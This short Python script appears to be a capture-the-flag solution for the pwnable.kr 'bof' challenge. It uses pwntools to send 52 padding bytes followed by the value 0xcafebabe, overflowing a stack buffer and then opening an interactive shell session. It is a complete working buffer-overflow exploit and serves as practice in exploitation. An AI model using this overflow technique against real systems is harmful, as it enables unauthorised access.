from pwn import *

ex = remote('pwnable.kr',9000)
key = p32(0xcafebabe)
payload = b'A'*52
payload+= key
ex.send(payload+b'\n')
ex.interactive()
